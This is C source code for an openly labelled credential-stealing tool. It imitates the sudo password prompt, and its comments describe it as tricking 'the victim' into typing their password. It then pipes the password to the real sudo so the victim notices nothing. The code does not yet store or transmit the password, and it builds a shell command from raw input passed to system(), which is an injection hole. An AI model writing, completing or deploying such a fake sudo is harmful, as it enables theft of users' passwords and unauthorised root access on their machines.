#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>

#define MAX  100

int main(int argc, char const *argv[])
{
	struct passwd *usr = getpwuid(getuid());
	/* Contains the password for sudo access */
	char *password = NULL;
	/* The victim's intital parameters to run sudo with */
	char arguments[MAX] = {0};
	/* Full command to trick the victim into beleiving sudo ran successfully */
	char command[MAX] = {0};
	/* Contains the victim's original command */
	char orgiginal_cmd[MAX] = {0};
	size_t len = 0;
    ssize_t read;
    int i;

    /* Gather all the arguments supplied by the user and store them in a buffer */
    for (i = 1; i < argc; ++i)
    {
    	snprintf(arguments+strlen(arguments), sizeof(arguments)-strlen(arguments), " %s", argv[i]);
    }

    /*
    *	If we managed to get the current user, attempt to steal his password by faking sudo
    *	If not, simply pipe his command to sudo
    */
	if(usr)
	{
		printf("[sudo] password for %s: ", usr->pw_name);
		if((read = getline(&password, &len, stdin)) != 0){
			// Remove the \n at the end of the password, otherwise it messes up the command
			password[strlen(password)-1] = '\0';
			snprintf(command, sizeof(command), "echo %s | /usr/bin/sudo -S%s", password, arguments);
			system(command);
		}
		free(password);	
	} else {
		snprintf(orgiginal_cmd, sizeof(orgiginal_cmd), "/usr/bin/sudo%s", arguments);
		system(orgiginal_cmd);
	}
	return 0;
}